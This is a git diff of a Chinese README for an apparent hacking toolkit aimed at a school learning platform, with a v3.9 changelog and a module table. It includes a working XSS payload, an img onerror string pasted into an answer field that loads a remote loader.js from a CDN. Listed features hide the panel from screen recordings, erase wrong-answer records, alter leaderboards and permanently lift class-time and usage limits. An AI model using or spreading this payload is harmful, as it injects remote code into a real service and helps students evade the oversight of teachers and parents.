@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.8/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.9/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -27,6 +27,17 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.9
+
+- **主面板默认 10% 透明度**：注入后内容区几乎隐形，标题栏仍保留，随时能把透明度调回来；最低仍是 5%，设置存 `fh:mainOp`。
+- **AI 网页默认浮动窗**：打开就是可拖动、可缩放的小窗（宽度 ≤860、高度 ≤820），右下角手柄可调大小；位置 / 尺寸记在 `fh:ai:rect`，全屏后再退出会回到原来的浮动大小，不再卡在整屏。
+- **两个相机都换成圆形快门**：网页相机（`mods/media.js`）和 AI 拍照（`mods/ai.js`）中间都是大圆快门，左右放翻转 / 录像或关闭；按下的缩放动画保留。
+- **AI 拍照支持变焦**：优先用摄像头原生 `zoom` 能力，没有就用画面中心裁切模拟；滑杆 / ± 按钮 1×–4×（原生上限更高时按设备），成片与预览一致。
+- **相机预览不裁切**：网页相机由 `object-fit:cover` 改成 `contain`，画面完整显示，比例不一致时用黑边填充，不再切掉边缘。
+- **新增 🧭 探测**：工具页打开 `mods/probe.js`，集中提供权限状态快照、摄像头 / 麦克风 / 定位 / 屏幕共享、文件 / 剪贴板 / 分享 / 联系人、全屏 / 常亮 / 振动 / 通知 / 传感器 / 电池 / 网络、蓝牙 / USB / 串口 / HID / MIDI / NFC，以及电话 / 短信 / 微信 / 支付宝 / 淘宝等外部 App 的 URI Scheme 唤起。网页不能枚举已安装软件，也不能绕过系统授权，按钮会真实发起请求并显示 granted / denied / 不支持。
+- **修网页返回键**：网页窗口改为真栈：只显示栈顶，← 退回上一个网页，栈底再退回网页列表；✕ 关闭当前并露出上一个，返回不再删除错窗口。
+- 版本号 `TAG` / AI 头栏 / 聊天室徽标 / 主面板标签统一升到 3.9。
 
 ## v3.8
 
@@ -131,8 +142,9 @@
 | ✏️ 改名 | `mods/rename.js` | 清玩家名 / 灵宠名 / 排行榜里的旧记录 |
 | 🧹 清答案 | `mods/clean.js` | 删错题本里存的答题原文 `yourAns` |
 | 🖼 图片 | `mods/img.js` | 直链图片全屏弹窗 |
-| 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗；顶栏「←」回到上一个网页（受对方 X-Frame-Options 限制） |
-| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像 / 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/<用户名>/` |
+| 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗；真栈返回：← 回上一个网页 / 列表（受对方 X-Frame-Options 限制） |
+| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像（完整比例、圆形快门）/ 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/<用户名>/` |
+| 🧭 探测 | `mods/probe.js` | 权限状态、摄像头 / 麦克风 / 定位 / 屏幕共享、文件 / 剪贴板 / 分享、传感器 / 电池 / 网络、蓝牙 / USB / 串口 / HID / MIDI / NFC、外部 App URI Scheme |
 | 📦 存档 | `mods/dump.js` | 展示并复制完整 `state` JSON |
 | 💣 清空 | `mods/reset.js` | 清 `wycg_v3` + `wycg_rank_v1` |
 | ⏱ 解除限时 | `loader.js` | 一键永久解除上课时段 / 周末 / 20 分钟配额 |
